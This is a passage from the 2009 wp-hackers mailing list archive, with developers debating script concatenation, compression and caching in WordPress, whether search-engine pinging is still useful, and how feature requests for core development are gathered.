>> ?wp_enqueue/register_script: this is important for Web-wide caching of
>> ?scripts loaded from ajax.googleapis.com, for example. When registering
>> ?new scripts, pass the filemtime in as the version so that whenever a file
>> ?changes, the concatenated script will be regenerated.
>
> This issue of ver being included even when not supplied will not be
> avoidable using the core in 3.0 following on from the fix of this ticket -
> http://core.trac.wordpress.org/ticket/11315
>
I?m using the new value on a site running trunk, and it works fine:

wp_deregister_script('jquery');
wp_register_script('jquery', 'http://path/to/googleapis/jquery', FALSE, NULL);

On the general subject of compression/caching and WP core, I?m happy
this was removed from the core, as it is the business of the server.

And, as it is the business of the server, one good thing I believe we
can do is start recommending shared-hosting providers that support PHP
caching and gzipping.  Admittedly, this functionality comes at a cost,
and you will probably not find it in $39.99/year packages, but I?ve
seen modern providers offering it in packages that come at around
$100/year.

Cheers!

Demetris
http://op111.net/

From pavelevap at post.cz  Tue Dec 29 12:19:29 2009
From: pavelevap at post.cz (=?us-ascii?Q?Pavel=20Hejn?=)
Date: Tue, 29 Dec 2009 13:19:29 +0100 (CET)
Subject: [wp-hackers] Ping pages
Message-ID: <56692.8725.29646-7636-43416360-1262089169@post.cz>

Hi,

is it possible to automatically ping rpc.pingomatic.com also with pages?
Only posts ping search engines and it is a little problem for websites with many pages...
I tried to find any solution, but I was not successfull (no plugin, filter, etc...).

Thank you for your help...

From ozh at planetozh.com  Tue Dec 29 12:32:25 2009
From: ozh at planetozh.com (Ozh)
Date: Tue, 29 Dec 2009 13:32:25 +0100
Subject: [wp-hackers] Ping pages
In-Reply-To: <56692.8725.29646-7636-43416360-1262089169@post.cz>
Message-ID: <OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>

> is it possible to automatically ping rpc.pingomatic.com also with pages?

candid question: is it still of any use to ping? Hadn't thought about this 
feature for at least the last 2 years...

Ozh

From wordpress at santosj.name  Tue Dec 29 14:25:49 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Tue, 29 Dec 2009 08:25:49 -0600
Subject: [wp-hackers] compression and caching
In-Reply-To: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
Message-ID: <4B3A116D.6010200@santosj.name>

No, the merits of compressing and caching are not being debated here nor 
were they ever being debated. No one has ever said that compression or 
caching shouldn't be done. We have only been saying that there are too 
many solutions, many of them Apache or manually driven to be placed in 
WordPress itself.

I think the entire problem is that this fact alone has been pushed aside 
and provided a longer debate than what is required. What is being 
debated and often ignored is that many of the better ways to compress 
files aren't even in PHP, but Apache or some manual process and for that 
caching a file has so many solutions finding the best one for all people 
is going to be extremely large solution.

What Micah and I guess you keep coming back to is using what is said for 
Caching as if we said it for Compression and it is very annoying. I 
don't like wasting time talking to people who don't listen, so I guess 
Otto is still talking to a brick wall even now.

Finding a solution that fits one person may not be the best for another. 
Having a ton of options in WordPress may not work because it relies on 
the person knowing what they are used for. "Testing" for each feature 
may work in majority of cases, but would add a lot of time to 
development. In this realm, if someone wishes to add compression, they 
have an unlimited amount of choices (well not yet, but could in the 
future) of what they can do and what works best for them.

There is also a plugin that will minify all of your scripts on the fly 
with some file caching and expires.

Jacob Santos

From otto at ottodestruct.com  Tue Dec 29 15:02:20 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 29 Dec 2009 09:02:20 -0600
Subject: [wp-hackers] compression and caching
In-Reply-To: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
Message-ID: <161617690912290702n46df426fte6b64e4c59b0756f@mail.gmail.com>

On Mon, Dec 28, 2009 at 10:49 PM, Weston Ruter <westonruter at gmail.com> wrote:
> ? 2. Minifies code using Google's Closure Compiler.

The existing JS and CSS libraries in the core already are pre-minified
versions of themselves, and those get loaded by default, unless you
force it into debug mode. If you want to include pre-minified versions
of your own personal JS libraries, then that's real easy to do right
now, no third-party servers needed.

> ? 3. Caches the concatenated/minified code and rebuilds it only when one of
> ? its source scripts expires or changes. The optimizescripts_expires filter
> ? is provided which allows the far-future expires time to be forced.
> ? 4. Filename for concatenated/minified script is the md5 of all the
> ? handles concatenated together (thus if an additional handle is provided, a
> ? new concatenated script is generated).

All this seems like it would offer zero performance improvement to me,
especially on the front end of the site. You're doing all this
processing to save yourself a minor amount of time, when all you
really need to do is to do it manually one time and put the files in
the proper places. Serving static files is *always* faster than
serving dynamic ones. And if you're screwing with the headers, then
you're reaching. You should configure your webserver properly to serve
the proper headers with your static files instead.

Using PHP to overcome your inability or unwillingness to properly
configure your Apache instance is definitely something that should not
be in WordPress.

> ? 5. Provides a filter to limit which scripts get concatenated (i.e. jQuery
> ? on ajax.googleapis.com should be left alone); by default, all scripts on
> ? local host are concatenated, and remote scripts are left alone.
> ? 6. Removes the default 'ver' query parameter which WordPress adds to
> ? every script src if no version argument is supplied on
> ? wp_enqueue/register_script: this is important for Web-wide caching of
> ? scripts loaded from ajax.googleapis.com, for example. When registering
> ? new scripts, pass the filemtime in as the version so that whenever a file
> ? changes, the concatenated script will be regenerated.

Already done.

http://wordpress.org/extend/plugins/use-google-libraries/

No version parameter gets added, the plugin replaces the existing
enqueued scripts with the google versions. Works perfectly.

> ? 7. Script optimization can be delegated to a scheduled cron job so that
> ? the server does not periodically respond slowly to visitors.

Do your scripts and CSS *really* change often enough that you need to
do this more than one time? I mean, most people are not editing and
adding javascripts and CSS to their site particularly often.

> I'm eager to hear what you all think about this approach and if would be
> good to include in WordPress core so that it can be fast by default in how
> it serves scripts.

There is such a thing as over-optimization. I think that this will
decrease performance on most people's systems, because you're doing a
lot of unnecessary compressing, concatenating, minifying, etc.

That said, for the admin side of things, WordPress *already*
concatenates and minifies both JS and CSS in WP 2.9. In my own
informal testing, I get better results when I turn all that crap off
(and even better results with the Use Google Libraries plugin), but
then that's me and my configuration. Your configuration may be
different, which is sorta the whole point.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Tue Dec 29 15:19:56 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 29 Dec 2009 09:19:56 -0600
Subject: [wp-hackers] Ping pages
In-Reply-To: <OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
References: <56692.8725.29646-7636-43416360-1262089169@post.cz> 
	<OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
Message-ID: <161617690912290719y5a5cde41xdd9881e3121644f7@mail.gmail.com>

On Tue, Dec 29, 2009 at 6:32 AM, Ozh <ozh at planetozh.com> wrote:
> candid question: is it still of any use to ping? Hadn't thought about this
> feature for at least the last 2 years...

I turned off RPC pinging some time ago and have not seen any
differences in search engines finding my posts and such.

RSSCloud and PubSubHubbub are a tad more useful than pinging, IMO.

-Otto
Sent from Memphis, TN, United States

From william.canino at googlemail.com  Tue Dec 29 18:16:04 2009
From: william.canino at googlemail.com (William Canino)
Date: Tue, 29 Dec 2009 13:16:04 -0500
Subject: [wp-hackers] Ping pages
In-Reply-To: <OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
References: <56692.8725.29646-7636-43416360-1262089169@post.cz>
	<OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
Message-ID: <e4dc67e0912291016u48da8c12ya72f4bd4d3d65e28@mail.gmail.com>

> candid question: is it still of any use to ping? Hadn't thought about this
> feature for at least the last 2 years...

Pinging is the only way that Google is able to display "15 minutes
ago" when it shows my post to the world in its top search results
moments after I click "Publish",  Enough reason to ping, I think!

It isn't the sitemaps ping, i.e.,
http://www.google.com/webmasters/sitemaps/ping?sitemap=http://www.name.com/sitemap.xml
.

I don't know how fast Googlebot comes after I ping. I gotta try that sometime.

W




2009/12/29 Ozh <ozh at planetozh.com>:
>> is it possible to automatically ping rpc.pingomatic.com also with pages?
>
> candid question: is it still of any use to ping? Hadn't thought about this
> feature for at least the last 2 years...
>
> Ozh
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From william.canino at googlemail.com  Tue Dec 29 18:34:14 2009
From: william.canino at googlemail.com (William Canino)
Date: Tue, 29 Dec 2009 13:34:14 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
Message-ID: <e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com>

Weston,

> I'm eager to hear what you all think about this approach

Here's my feedback:

My sites do not change their scripts and css every day, or even once a
week.  And certainly the js and css do not change in-between every
visitor's two pageloads.  For this reason, I think your plugin's
processing is best as a button inside the blog's admin area -- run by
the site admin when so inclined -- and not hooked into the blog page's
loading process.

Your solution is like running "OPTIMIZE TABLE wp_options" on every page load.

On the other hand, I am pleased that your plugin writes .js files, not
.php files, unlike Leon Chevalier's PHPSpeedy.



And, Weston, constructive suggestion: See
http://codex.wordpress.org/WordPress_Coding_Standards .


2009/12/28 Weston Ruter <westonruter at gmail.com>:
> Hi all, I'm new here. Micah invited me to join in on the discussion.
>
> I just read most of the messages in this thread, and I see most of them are
> debating the merits of compressing (gzipping) responses. Regarding scripts
> alone, just concatenating the enqueued scripts and minifying them will
> result in drastic speedups without gzipping at all. For example, I recently
> a WordPress site built by a reputable company that had 50(!) external
> JavaScript files. If these were all concatenated together and
> minified/optimized, then there would potentially be only one download. As an
> added bonus, this optimized script could be gzipped and even more
> importantly be served with a far-future expires header.
>
> I have been developing a plugin called ?Optimize Scripts? which does just
> this. As the plugin page states, it:
>
> ? 1. Respects head and footer groups.
> ? 2. Minifies code using Google's Closure Compiler.
> ? 3. Caches the concatenated/minified code and rebuilds it only when one of
> ? its source scripts expires or changes. The optimizescripts_expires filter
> ? is provided which allows the far-future expires time to be forced.
> ? 4. Filename for concatenated/minified script is the md5 of all the
> ? handles concatenated together (thus if an additional handle is provided, a
> ? new concatenated script is generated).
> ? 5. Provides a filter to limit which scripts get concatenated (i.e. jQuery
> ? on ajax.googleapis.com should be left alone); by default, all scripts on
> ? local host are concatenated, and remote scripts are left alone.
> ? 6. Removes the default 'ver' query parameter which WordPress adds to
> ? every script src if no version argument is supplied on
> ? wp_enqueue/register_script: this is important for Web-wide caching of
> ? scripts loaded from ajax.googleapis.com, for example. When registering
> ? new scripts, pass the filemtime in as the version so that whenever a file
> ? changes, the concatenated script will be regenerated.
> ? 7. Script optimization can be delegated to a scheduled cron job so that
> ? the server does not periodically respond slowly to visitors.
>
> Read more and see examples on the plugin page:
> http://wordpress.org/extend/plugins/optimize-scripts/
>
> This plugin also relies on server configuration in that a far-future expires
> header must be set, or otherwise the plugin will abort concatenation.
> (However, the optimizescripts_expires filter mentioned above is a workaround
> for this.)
>
> I'm eager to hear what you all think about this approach and if would be
> good to include in WordPress core so that it can be fast by default in how
> it serves scripts.
>
> Weston
>
>
> *William Canino* wrote at *Mon Dec 28 21:22:29 UTC 2009*:
>
>> Let me share with you guys my .htaccess file. I got more gains with
>>
>> this config in my experience than minifying and concatenating on the
>> fly hereby killing the CPU of my shared host.
>>
>> # Far Expires
>> FileETag All
>> ExpiresActive On ?# enable expirations
>> ExpiresByType text/javascript "access plus 5 weeks"
>>
>>
>> ExpiresByType application/x-javascript "access plus 5 weeks"
>> ExpiresByType application/javascript "access plus 5 weeks"
>> ExpiresByType text/css "access plus 5 weeks"
>>
>> # Javascript and CSS Gzipping
>>
>>
>> # copied from http://zuble.blogspot.com/2007/02/compressed-js-and-modrewrite.html
>> <FilesMatch "\\.js.gz$">
>>
>> ? ForceType text/javascript
>>
>> ? Header set Content-Encoding: gzip
>> </FilesMatch>
>> <FilesMatch "\\.js$">
>> ? RewriteEngine On
>> ? RewriteCond %{HTTP:Accept-Encoding} gzip
>> ? RewriteCond %{HTTP_USER_AGENT} !".*Safari.*"
>>
>>
>> ? RewriteCond %{REQUEST_FILENAME}.gz -f
>> ? RewriteRule (.*)\.js$ $1\.js.gz [L]
>> ? ForceType text/javascript
>> </FilesMatch>
>> <FilesMatch "\\.css.gz$">
>> ? ForceType text/css
>> ? Header set Content-Encoding: gzip
>>
>>
>> </FilesMatch>
>> <FilesMatch "\\.css$">
>> ? RewriteEngine On
>> ? RewriteCond %{HTTP:Accept-Encoding} gzip
>> ? RewriteCond %{HTTP_USER_AGENT} !".*Safari.*"
>> ? RewriteCond %{REQUEST_FILENAME}.gz -f
>>
>>
>> ? RewriteRule (.*)\.css$ $1\.css.gz [L]
>> ? ForceType text/css
>> </FilesMatch>
>>
>> I then saved a minified+gzipped version of each css and js on the
>> respective directories.
>>
>> Don't joke -- I *have* killed a shared hosting CPU before by
>>
>>
>> dynamically concatenating, minifying and compressing assets.
>>
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From malaiac at gmail.com  Tue Dec 29 18:44:06 2009
From: malaiac at gmail.com (Malaiac)
Date: Tue, 29 Dec 2009 19:44:06 +0100
Subject: [wp-hackers] compression and caching
In-Reply-To: <e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
	<e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com>
Message-ID: <59e7f3130912291044r1a728ec9lca52c48b1b5b4c51@mail.gmail.com>

My 2 cents about optimisation.
I wrote this post
http://www.malaiac.net/465-optimisation-wordpress.html a few weeks ago
(in French) about WP and general server optimisation.

Should not be in core. While I'm a fervent advocate of core dev
harassment when needed, I'll pass on this one. Too many configs, too
many needs. In some WP installs, I just need a quick speed up, I use
WP Cache. On others, ranging from 10k to 120k pageviews a day, I need
fine tuning and extreme speed.

What I'd like to see : a way to concatenate user scripts into wp scripts.

My main concern : time to first byte. I can't get this one to stay
under 1 second, which is too much.

From mikeschinkel at newclarity.net  Tue Dec 29 19:00:48 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 14:00:48 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <op.u5ovfbfsspxmuu@dd32>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
Message-ID: <FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>

On Dec 29, 2009, at 2:36 AM, Dion Hulse (dd32) wrote:
> On Tue, 29 Dec 2009 07:31:46 +1100, Dan Cole <wp at dan-cole.com> wrote:
>> <snip>
> 
> Sounds good to me, Here's my long brainstorm of some changes which could be useful.
> Please note, That when i say a clear policy, I mainly mean a published document somewhere redibly accessable by users that explains it all. I also do not intend to attack anyone personally, if something i mention sounds like something you may have done, Do not take it as an arguement, Its mainly my opinion of how i'd like to see things happen.
> 
> I'd like to preface it by saying that WordPress in general seems to be staying pretty open about whats happening, although i agree that sometimes theres a bit of a "so and so said this was coming in 3.0!" etc sort of item before theres even been a meeting to decide.. but sometimse developers will get behind something and do it, knowing its in the end users best interests, you have to trust them sometimes :) - Make sure you read the Setting Scope blog post however before anyone comments on that statement please.

I'd really like to see a User Voice site set up for WordPress, for example:

http://xero.uservoice.com

Using User Voice the community could really get a clear picture of what the community is interested in rather than the anecdotal evidence that it seems is currently used.

UserVoice is free for Open Source:

http://uservoice.com/for/opensource

>  * Its my opinion, That no feature request should ever be opened on trac first, should be brought up on wp-hackers or the support forums first (Or another location with lots of WP'ers. or Unless it has been put past a core developer who strongly supports it)

I'd agree in principle but in practice, at least on this list there is a small yet very vocal group of people who make it their personal mission to thwart any initiative that they don't particularly agree with.  For that to change new ground rules requiring people to be respectful of other's opinions would need to be set and someone with authority to moderate the list would need to be set up to do so. Honestly I don't see a moderator as workable nor the culture of this list changing, and if it doesn't then this list is not the proper place to discuss new features.

It would be far better to use UserVoice.  Lots of companies are using it to great avail; why not WordPress? That way you've got a lot more transparency and a lot less noise and personal attacks.

> More In general:
> * I think people need to realise when they're solution is not best, I am myself guilty of this, and so have many others. I've seen too many people flood trac/wp-hackers without reconising what could potentially be their mis-understanding of a problem, the suggestion, or to be fair, sometimes may not have a indepth knowledge of the issue to understand the effects of it
>  * So i ask people to think of that next time in an arguement, try to keep your mind open, Even if it goes against every bone in your body to even consider the other approach, it pays off to at least look it over.

People are going to be people and w/o a moderator who enforces certain behavior w/o taking sides, nothing will change on the wp-hackers list.

JMTCW, FWIW.

-Mike Schinkel

From mikeschinkel at newclarity.net  Tue Dec 29 19:29:02 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 14:29:02 -0500
Subject: [wp-hackers] compression and caching
In-Reply-To: <59e7f3130912291044r1a728ec9lca52c48b1b5b4c51@mail.gmail.com>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com>
	<e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com>
	<59e7f3130912291044r1a728ec9lca52c48b1b5b4c51@mail.gmail.com>
Message-ID: <8606CC44-E097-4580-BF02-676CB5974B55@newclarity.net>

My 2 cents about compression and caching, and the core vs. plugin debate in general.

While I agree it probably shouldn't be in the core one I think what is often overlooked in these arguments of core vs. plugin is the need for shared architecture.  Often plugin provides functionality that multiple plugins would need to implement even if they addressing different aspects of the same problem. When the answer is "that should be in a plugin" then you get plugins duplicating effort and often being incompatible with related plugins that ideally should be compatible.

Instead what is needed is to look at the problem and determine if there are fundamental aspects of the need that can and should be put into core[1] so that other plugins can build upon them.  While I have not personally dived into the code for any compression or caching plugins I can envision that there really could be functionality implemented that would make sense in the core and then exposed via many different plugins.
 
Let me give a specific example.  I had a client project where they wanted 5 star rating functionality. "No problem" I thought, "I'll use a plugin."  Except when time came to implement that feature I learned 1.) they wanted it to behave slightly differently and 2.) they wanted to rate things that no plugins supportted.  "Okay" I thought, "I'll just modify one of them." Then I tried to modify the plugins and found that, while they had *tons* of features they had no internal hooks and they were coded so badly that modifying was practically impossible.  So I had to tell the client I'd be late delivering the app by the 3 days it took to design, code and test a 5 star ratings plugin[2] from scratch. Let me tell you they were none to happy.

Now had a base-level 5 star rating plugin been included in the core and with hooks to enable it to be modified or enhanced I could have done what I needed in an hour or two. Which brings me to another rarely mentioned problem with relegating functionality to plugins; plugins are rarely if ever designed to be enhanced by other programmers. 

And these are some of the reasons why "it should be left to a plugin" is such an unsatisfactory answer to so many people. Unless we address these reasons these ad-nauseum debates will continue ad-nauseum.

FWIW.

-Mike Schinkel

[1] Now when I say "core" here maybe I should be saying "canonical plugin" but since the latter is not yet available I'll just say "core" until then.

[2] I made a plugin that could be released and, with hooks added, be the base for what I'm referring to I've just not found the time to add the hooks and release it.

From mark at watero.us  Tue Dec 29 19:38:35 2009
From: mark at watero.us (mark waterous)
Date: Tue, 29 Dec 2009 11:38:35 -0800
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>
	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>
Message-ID: <003401ca88be$84151b60$8c3f5220$@us>

> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-
> bounces at lists.automattic.com] On Behalf Of Mike Schinkel
> Sent: Tuesday, December 29, 2009 11:01 AM
> 
> 
> I'd really like to see a User Voice site set up for WordPress, for
> example:
> 
> http://xero.uservoice.com


Isn't that what this is?
http://wordpress.org/extend/ideas/

--
Mark Waterous
http://mark.watero.us/
(mark at watero.us) 




From mikeschinkel at newclarity.net  Tue Dec 29 19:52:54 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 14:52:54 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <003401ca88be$84151b60$8c3f5220$@us>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>
	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>
	<003401ca88be$84151b60$8c3f5220$@us>
Message-ID: <D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>

On Dec 29, 2009, at 2:38 PM, mark waterous wrote:
>> I'd really like to see a User Voice site set up for WordPress, for
>> example:
>> 
>> http://xero.uservoice.com
> 
> Isn't that what this is?
> http://wordpress.org/extend/ideas/

Funny, before writing the suggestion to use UserVoice I went looking for exactly that but couldn't find it. :)

Anyway, that doesn't work nearly as well as UserVoice.  For example you get 10 points per login to rate features on UserVoice so you have to choose what is most important to you.  On wordpress.org/extend/idea I can rate everything I want a 5 star idea.  Plus UserVoice is proactively in the business of providing tools to soliciting user feedback whereas it's an afterthought on Wordpress.org.

JMTCW anyway.

-Mike Schinkel

P.S. OTOH, take a look at the top 5; haven't they been in the top 5 for two years now?  Why haven't they been addressed?  Seriously?


From otto at ottodestruct.com  Tue Dec 29 19:58:16 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 29 Dec 2009 13:58:16 -0600
Subject: [wp-hackers] Ping pages
In-Reply-To: <e4dc67e0912291016u48da8c12ya72f4bd4d3d65e28@mail.gmail.com>
References: <56692.8725.29646-7636-43416360-1262089169@post.cz> 
	<OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>
	<e4dc67e0912291016u48da8c12ya72f4bd4d3d65e28@mail.gmail.com>
Message-ID: <161617690912291158o3366b613x6aa2469301a342f@mail.gmail.com>

On Tue, Dec 29, 2009 at 12:16 PM, William Canino
<william.canino at googlemail.com> wrote:
>> candid question: is it still of any use to ping? Hadn't thought about this
>> feature for at least the last 2 years...
>
> Pinging is the only way that Google is able to display "15 minutes
> ago" when it shows my post to the world in its top search results
> moments after I click "Publish", ?Enough reason to ping, I think!
>
> It isn't the sitemaps ping, i.e.,
> http://www.google.com/webmasters/sitemaps/ping?sitemap=http://www.name.com/sitemap.xml
> .
>
> I don't know how fast Googlebot comes after I ping. I gotta try that sometime.

If you want sub-minute times for Google indexing, your best bet is to
use PubSubHubbub. You can get this automatically if you use
FeedBurner, or you can run your own.

From m at mullenweg.com  Tue Dec 29 20:09:49 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 29 Dec 2009 12:09:49 -0800
Subject: [wp-hackers] Ping pages
In-Reply-To: <161617690912291158o3366b613x6aa2469301a342f@mail.gmail.com>
References: <56692.8725.29646-7636-43416360-1262089169@post.cz>
	<OFBC72CBF1.F62F42B8-ONC125769B.0044C422-C125769B.0044E334@notes.edfgdf.fr>	<e4dc67e0912291016u48da8c12ya72f4bd4d3d65e28@mail.gmail.com>
	<161617690912291158o3366b613x6aa2469301a342f@mail.gmail.com>
Message-ID: <4B3A620D.9000608@mullenweg.com>

On 2009-12-29 11:58 AM, Otto wrote:
> If you want sub-minute times for Google indexing, your best bet is to
> use PubSubHubbub. You can get this automatically if you use
> FeedBurner, or you can run your own.

I have seen no information even suggesting that PSHB is hooked up to 
search results, where all major search engines listen to the Pingomatic 
feed.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From m at mullenweg.com  Tue Dec 29 20:12:27 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 29 Dec 2009 12:12:27 -0800
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>
	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>
Message-ID: <4B3A62AB.4080809@mullenweg.com>

On 2009-12-29 11:52 AM, Mike Schinkel wrote:
> Anyway, that doesn't work nearly as well as UserVoice.

We can make the ideas forum better, and will. I prefer that over a 
dependency on an external, proprietary service.

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From mikeschinkel at newclarity.net  Tue Dec 29 20:18:33 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 15:18:33 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <4B3A62AB.4080809@mullenweg.com>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>
	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>
	<4B3A62AB.4080809@mullenweg.com>
Message-ID: <99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>

On Dec 29, 2009, at 3:12 PM, Matt Mullenweg wrote:
> On 2009-12-29 11:52 AM, Mike Schinkel wrote:
>> Anyway, that doesn't work nearly as well as UserVoice.
> 
> We can make the ideas forum better, and will. I prefer that over a dependency on an external, proprietary service.

Why must you reinvent the wheel when one already exists? Why work on something that you'll but 10% of your time into when someone else will be putting 100% of their time into? Why force us to wait on improvements until some unforeseen time in the future when those improvements could be had now?

The "Not Invented Here" syndrome has seen the downfall of many a powerful company. Why not learn from their experience?

http://en.wikipedia.org/wiki/Not_Invented_Here

-Mike Schinkel

From wp at twolanedesign.com  Tue Dec 29 20:30:46 2009
From: wp at twolanedesign.com (Micah)
Date: Tue, 29 Dec 2009 12:30:46 -0800
Subject: [wp-hackers] compression and caching
In-Reply-To: <8606CC44-E097-4580-BF02-676CB5974B55@newclarity.net>
References: <fb8299e10912282049h16b7442dr3b0d926348ab32ef@mail.gmail.com><e4dc67e0912291034k7804d943oc6bef5b6f4b17af4@mail.gmail.com><59e7f3130912291044r1a728ec9lca52c48b1b5b4c51@mail.gmail.com>
	<8606CC44-E097-4580-BF02-676CB5974B55@newclarity.net>
Message-ID: <3A34311F3401425B800D29E87A569520@Asuh>

Yikes, I never meant to PO anyone by bringing up this discussion. I only 
started this talk out of my concern for Wordpress and while I am totally 
willing to accept certain things shouldn't be and it should never be up to 
one person for a community to make a change. I believe in community support 
and I clearly hear the opposition so I will not add to this debate as I know 
Jacob and Otto are sick of me already.

My biggest cause here was to be forward thinking, to promote optimization to 
the core so that everyone benefits. I appreciate the feedback and apologize 
if I came across as an ignorant brick wall. While I don't agree this debate 
is settled, I don't think my contributing to it will help this cause 
anymore. However, I really hope this talk doesn't die simply as plugin 
dismissed. Thanks for listening. 


From mikeschinkel at newclarity.net  Tue Dec 29 20:36:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Tue, 29 Dec 2009 15:36:03 -0500
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>	<op.u5ovfbfsspxmuu@dd32>	<FEA4D45B-BA96-4B1F-AACB-970BB9B54F7D@newclarity.net>	<003401ca88be$84151b60$8c3f5220$@us>
	<D8CE5316-09AF-4DF8-AF84-7F8222080CC5@newclarity.net>
	<4B3A62AB.4080809@mullenweg.com>
	<99E9E100-108F-4113-9E9D-A44D122F0C1D@newclarity.net>
Message-ID: <61EE91D2-3B65-4024-A5C3-0F9217A06F9E@newclarity.net>

On Dec 29, 2009, at 3:18 PM, Mike Schinkel wrote:
> On Dec 29, 2009, at 3:12 PM, Matt Mullenweg wrote:
>> On 2009-12-29 11:52 AM, Mike Schinkel wrote:
>>> Anyway, that doesn't work nearly as well as UserVoice.
>> 
>> We can make the ideas forum better, and will. I prefer that over a dependency on an external, proprietary service.
> 
> Why must you reinvent the wheel when one already exists? Why work on something that you'll but 10% of your time into when someone else will be putting 100% of their time into? Why force us to wait on improvements until some unforeseen time in the future when those improvements could be had now?
> 
> The "Not Invented Here" syndrome has seen the downfall of many a powerful company. Why not learn from their experience?
> 
> http://en.wikipedia.org/wiki/Not_Invented_Here
> 

Let me add to this:

-- A lot more people are becoming familiar with how User Voice works than will ever be familiar with how WordPress' Ideas work. There is significant benefit to leveraging that which more people are familiar with[1]. 

-- If you ever find that your dependence on an external, proprietary service you can always revert to what you had before, and the benefits can rack up in the interim.

-- The (web) world is evolving to where people depend more and more on external proprietary services, i.e. [2]. Making decisions as if that were not happening is, respectfully speaking, not embracing the evolution of the web.

-Mike Schinkel
[1] http://socialcomputingjournal.com/viewlisting.cfm?id=84
[2] http://thesmallbusinessweb.com/

P.S. You have (at least) 3 constituency bases; users, themers and plugin developers.  What each of them want/need are different and ideally you'd have three different sets of idea forums (UserVoice or other) so that themers and plugin developers can recognize the top needs identified by other themers and plugin developers rather than have there issues be overwhelmed by user needs whose numbers are an order of magnitude larger but where themers and plugin developers efforts can be leveraged by an order of magnitude of users.  So the three list should all be looked at before determining priority.


From ryan at boren.nu  Tue Dec 29 20:44:20 2009
From: ryan at boren.nu (Ryan Boren)
Date: Tue, 29 Dec 2009 14:44:20 -0600
Subject: [wp-hackers] Improving WordPress Core Development
In-Reply-To: <op.u5ovfbfsspxmuu@dd32>
References: <8443cbbb0912281231y1ee7f473n7c5b840d3fe26eba@mail.gmail.com>
	<op.u5ovfbfsspxmuu@dd32>
